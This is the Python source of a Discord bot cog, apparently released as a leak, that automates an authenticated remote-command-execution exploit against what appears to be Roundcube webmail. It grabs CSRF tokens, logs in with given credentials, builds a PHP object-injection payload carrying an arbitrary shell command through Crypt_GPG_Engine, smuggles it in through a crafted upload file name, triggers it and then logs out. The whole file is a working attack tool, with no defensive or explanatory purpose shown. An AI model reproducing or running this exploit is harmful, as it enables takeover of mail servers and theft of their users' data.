# release if leaked 

import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import re
import random
from urllib.parse import urlparse, quote
import base64
import asyncio

class VANTAGE(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.session = aiohttp.ClientSession()

    def cog_unload(self):
        asyncio.create_task(self.session.close())

    @app_commands.command(
        name="VANTAGE",
        description="this doesnt exist bro"
    )
    @app_commands.describe(
        targ="??",
        username="???",
        password="???",
        command="nothing"
    )
    async def fuckyou(
        self,
        interaction: discord.Interaction,
        targ: str,
        username: str,
        password: str,
        command: str
    ):
        await interaction.response.defer(ephemeral=True)
        
        try:
            if not re.match(r'^https?://', targ):
                raise ValueError("?")
            
            await self.log(interaction, "starting")
            token, cookie = await self.fetchcsrf(targ)
            await self.log(interaction, "cool")
            scookie = await self.authenticate(
                targ, username, password, token, cookie
            )
            await self.log(interaction, f"{username}")
            
            targname, pfile = self.quickpay(command)
            await self.mainone(
                targ, scookie, targname, pfile
            )
            await self.log(interaction, "did something Happen Wow")
            
            await self.magic(targ, scookie)
            await self.log(interaction, "wow something happened i wonder what happened")
            
            await interaction.followup.send("error 200", ephemeral=True)
            
        except Exception as e:
            await interaction.followup.send(f"{str(e)}", ephemeral=True)

    # yeah ok we lowkey dont need this but it kinda helps right ***** fix ts
    async def log(self, interaction, message):
        await interaction.followup.send(f"*{message}*", ephemeral=True)

    async def fetchcsrf(self, targ):
        async with self.session.get(targ) as resp:
            body = await resp.text()
            headers = str(resp.headers)
            
            token = self.reqgrab(body)
            cookie = self.ext(headers)
            return token, cookie

    def reqgrab(self, body):
        match = re.search(r'(?:"request_token":"|&_token=)([^"&]+)', body)
        if not match:
            raise ValueError("wtf where xsrf")
        return quote(match.group(1))

    def ext(self, headers):
        cookies = []
        for match in re.finditer(r'Set-Cookie:\s*([^=]+)=([^;]+)', headers):
            if match.group(2) != '-del-':
                cookies.append(f"{match.group(1)}={match.group(2)}")
        return ';'.join(cookies)

    async def authenticate(self, targ, username, password, token, cookie):
        # *******, try :2096 next time 
        url = f"{targ}/?_task=login"
        data = {
            "_token": token,
            "_task": "login",
            "_action": "login",
            "_timezone": "_default_",
            "_url": "_task=login",
            "_user": username,
            "_pass": password,
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie
        }
        
        async with self.session.post(url, data=data, headers=headers) as resp:
            if resp.status != 302:
                raise ValueError("Authentication failed")
            return self.ext(str(resp.headers))

    def quickpay(self, command):
        payload = f'O:17:"Crypt_GPG_Engine":1:{{s:8:"\x00*\x00_gpgconf";s:{len(command)+2}:"{command};#";}}'
        processed = self.serialproc(payload)
        final = processed + 'i:0;b:0;'
        appendage = len(str(12 + len(final))) - 2 # ****** please fix this 
        
        targname = '!";i:0;' + final + '}";}}'
        pfile = f'x|b:0;preferences_time|b:0;preferences|s:{78 + len(final) + appendage}:\\"a:3:{{i:0;s:{56 + appendage}:\\".png'
        
        targname = ''.join([c + chr(random.randint(0, 9)) for c in targname])
        return targname, pfile

    def serialproc(self, serialized):
        result = []
        pos = 0
        
        while pos < len(serialized):
            if serialized.startswith('s:', pos):
                colon = serialized.find(':', pos + 2)
                length = int(serialized[pos+2:colon])
                start_str = colon + 2
                end_str = start_str + length
                
                if not serialized.startswith('";', end_str):
                    result.append(serialized[pos:start_str])
                    pos = start_str
                    continue
                
                clean = []
                for char in serialized[start_str:end_str]:
                    if not char.isprintable() or char in '\\|.':
                        clean.append(f"\\{ord(char):02x}")
                    else:
                        clean.append(char)
                
                result.append(f's:{length}:"{"".join(clean)}";')
                pos = end_str + 2
            else:
                result.append(serialized[pos])
                pos += 1
                
        return ''.join(result)

    async def mainone(self, targ, cookie, targname, pfile):
        url = f"{targ}/?_from=edit-{quote(targname)}&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload"
        boundary = "----john-john-john-john-john-john"
        png = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==")
        
        data = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="_file[]"; filename="{pfile}"\r\n'
            "Content-Type: image/png\r\n\r\n"
        ).encode() + png + f"\r\n--{boundary}--".encode()
        
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cookie": cookie
        }
        
        async with self.session.post(url, data=data, headers=headers) as resp:
            if "preferences_time" not in await resp.text():
                raise ValueError("Payload injection failed")

    async def magic(self, targ, cookie):
        async with self.session.get(targ, headers={"Cookie": cookie}) as resp:
            token = self.reqgrab(await resp.text())
        #await self.session.get('/', headers={"Cookie": cookie})
        await self.session.get(
            f"{targ}/?_task=logout&_token={token}",
            headers={"Cookie": cookie}
        )

async def setup(bot):
    await bot.add_cog(VANTAGE(bot))